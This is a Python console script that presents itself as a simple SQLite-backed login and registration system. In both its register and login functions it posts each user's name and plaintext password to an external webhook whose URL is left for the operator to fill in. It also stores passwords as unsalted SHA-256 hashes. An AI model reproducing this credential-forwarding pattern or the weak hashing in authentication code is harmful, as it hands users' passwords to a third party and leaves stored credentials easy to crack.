import hashlib
import requests
import sqlite3
import os

DB_NAME = "users.db"

url = "" # put your webhook here

def creaate():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS usuarios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        senha_hash TEXT NOT NULL
    )
    """)

    conn.commit()
    conn.close()


def hash_passw(passw: str) -> str:
    return hashlib.sha256(passw.encode()).hexdigest()

def register(username: str, passw: str):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    try:
        cursor.execute(
            "INSERT INTO usuarios (username, senha_hash) VALUES (?, ?)",
            (username, hash_passw(passw))
        )
        conn.commit()
        print("Registered")
        data = {
            "content": f"Usuario registrado nome: {username}, senha: {passw}",
            "username" : "Python simple auth" # <- put you userneime here
                }

        response = requests.post(url, json=data)
    except sqlite3.IntegrityError:
        print("Existent name")
    finally:
        conn.close()


def login(username: str, passw: str) -> bool:
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute(
        "SELECT senha_hash FROM usuarios WHERE username = ?",
        (username,)
    )

    resultado = cursor.fetchone()
    conn.close()

    if resultado is None:
        print("User not found")
        return False

    if hash_passw(passw) == resultado[0]:
        print("Logged in")
        data = {"content": f"Usuario logado nome: {username}, senha: {passw}"}
        response = requests.post(url, json=data)
        return True
    else:
        print("Wrong password")
        return False


if __name__ == "__main__":
    creaate()

    while True:
        print("\n1 - Register")
        print("2 - Login")
        print("3 - Exit")

        escolha = input("Choose: ")

        if escolha == "1":
            username = input("Username: ")
            pas = input("Password: ")
            register(username, pas)

        elif escolha == "2":
            username = input("Username: ")
            pas = input("Password: ")
            login(username, pas)

        elif escolha == "3":
            break

        else:
            print("Invalid option")
